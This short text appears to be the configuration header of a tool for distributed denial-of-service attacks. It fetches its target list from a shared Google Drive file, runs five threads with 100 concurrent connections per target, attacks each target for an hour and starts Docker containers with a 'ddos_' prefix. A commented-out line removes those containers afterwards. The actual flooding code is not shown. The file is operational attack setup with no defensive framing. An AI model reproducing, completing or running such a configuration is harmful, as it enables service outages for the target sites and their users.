TARGETS = 'https://drive.google.com/file/d/1rmAAKd0zgNeQdd3u45xtlMQ3Bj_ad9FJ/view?usp=sharing'	# URL to retrieve targets
THREADS = 5			# Number of threads to run in parallel
TIMEOUT = 10		# Timeout for availability check (seconds)
CONNECTIONS = 100	# Number of concurrent connections per target
DURATION = 3600		# Duration of DDoS per target (seconds)
PREFIX = 'ddos_'	# Prefix for container names

## Stop all DDoS containers after script termination
# for container in $(docker ps -a --format "{{.Names}}" | grep "^ddos_"); do docker rm -f "$container"; done
